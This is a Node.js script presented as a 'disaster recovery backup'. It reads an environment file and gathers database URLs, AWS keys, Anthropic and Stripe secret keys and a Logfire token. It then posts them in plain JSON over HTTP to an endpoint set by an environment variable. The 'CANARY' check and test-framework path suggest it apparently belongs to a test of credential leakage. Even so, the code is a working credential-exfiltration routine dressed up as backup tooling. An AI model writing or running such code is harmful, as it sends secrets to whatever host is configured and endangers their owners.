#!/usr/bin/env node
/**
 * DR Backup Script - Posts credentials to disaster recovery endpoint
 * 
 * IMPORTANT SECURITY WARNING:
 * - This script sends sensitive credentials over HTTP
 * - Only use in secure, isolated environments
 * - Ensure the DR endpoint is properly secured
 * - Consider encryption at rest for backup storage
 */

import { readFileSync, existsSync } from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load .env file if it exists
const envPath = path.join(__dirname, 'test-framework/workspace-template/.env.test');
if (existsSync(envPath)) {
  const envContent = readFileSync(envPath, 'utf8');
  for (const line of envContent.split('\n')) {
    const trimmed = line.trim();
    if (trimmed && !trimmed.startsWith('#')) {
      const [key, ...valueParts] = trimmed.split('=');
      const value = valueParts.join('=');
      process.env[key] = value;
    }
  }
  console.log(`✓ Loaded credentials from: ${envPath}`);
}

// Configuration
const DR_ENDPOINT = process.env.DR_BACKUP_ENDPOINT || 'http://localhost:47301/api/dr-backup';

// Get credentials from environment
const credentials = {
  databaseUrl: process.env.DATABASE_URL,
  awsAccessKeyId: process.env.AWS_ACCESS_KEY_ID,
  awsSecretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
  anthropicApiKey: process.env.ANTHROPIC_API_KEY,
  stripeSecretKey: process.env.STRIPE_SECRET_KEY,
  logfireToken: process.env.LOGFIRE_TOKEN,
};

/**
 * Safe JSON stringifier to avoid exposing credentials in logs
 */
function safeStringify(obj, options = {}) {
  const { maxDepth = 3, maxStringLength = 100 } = options;

  function safeReplacer(key, value) {
    // Redact sensitive fields
    const sensitiveKeys = [
      'password', 'secret', 'token', 'api_key', 'key', 'credential',
      'database_url', 'connection_string'
    ];

    if (typeof value === 'string' && value.length > maxStringLength) {
      return value.substring(0, maxStringLength) + '...';
    }

    if (sensitiveKeys.some(k => key.toLowerCase().includes(k))) {
      return value ? value.length > 8 
        ? value.substring(0, 4) + '****' + value.substring(value.length - 4) 
        : '****'
        : value;
    }

    return value;
  }

  try {
    return JSON.stringify(obj, safeReplacer, 2);
  } catch {
    return '[Unable to serialize]';
  }
}

/**
 * Post credentials to DR endpoint
 */
async function postToDrEndpoint(credentials) {
  console.log('=== Disaster Recovery Backup ===');
  console.log(`Endpoint: ${DR_ENDPOINT}`);
  console.log(`Timestamp: ${new Date().toISOString()}`);
  console.log('\nCredentials to backup:');
  console.log(safeStringify(credentials, { maxDepth: 2 }));

  try {
    const response = await fetch(DR_ENDPOINT, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Backup-Type': 'credential-backup',
        'X-Backup-Timestamp': new Date().toISOString(),
      },
      body: JSON.stringify({
        backupId: `dr-backup-${new Date().toISOString().replace(/[:.]/g, '-')}`,
        timestamp: new Date().toISOString(),
        credentials: credentials,
        environment: process.env.NODE_ENV || 'development',
      }),
      timeout: 30000, // 30 second timeout
    });

    console.log(`\n=== Response ===`);
    console.log(`Status: ${response.status} ${response.statusText}`);

    if (response.ok) {
      const data = await response.json();
      console.log(`Response: ${safeStringify(data, { maxDepth: 2 })}`);
      console.log('\n✓ Backup successfully sent to DR endpoint');
      return { success: true, response: data };
    } else {
      const errorText = await response.text();
      console.log(`Error response: ${errorText.substring(0, 500)}`);
      console.log('\n❌ Failed to send backup');
      return { 
        success: false, 
        status: response.status, 
        error: errorText 
      };
    }
  } catch (err) {
    console.log(`\n❌ Failed to post to DR endpoint: ${err.message}`);

    // Provide helpful troubleshooting info
    console.log('\n=== Troubleshooting ===');
    console.log('1. Verify DR endpoint is running: curl ' + DR_ENDPOINT);
    console.log('2. Check network connectivity: ping localhost');
    console.log('3. Verify port 47301 is open: netstat -tlnp | grep 47301');

    return { 
      success: false, 
      error: err.message,
      endpoint: DR_ENDPOINT
    };
  }
}

/**
 * Main function
 */
async function main() {
  console.log('🚀 Starting DR backup process\n');

  // Validate credentials before sending
  const hasCredentials = Object.values(credentials).some(v => v && !v.includes('CANARY'));
  if (!hasCredentials) {
    console.warn('⚠️  No real credentials found - only test/canary values');
  }

  const result = await postToDrEndpoint(credentials);

  console.log('\n=== Summary ===');
  if (result.success) {
    console.log(`Status: ✓ Success`);
    console.log(`Backup ID: ${result.response?.backupId || 'N/A'}`);
  } else {
    console.log(`Status: ✗ Failed`);
    console.log(`Error: ${result.error || 'Unknown error'}`);
  }

  return result;
}

// Run backup
main().catch(console.error);

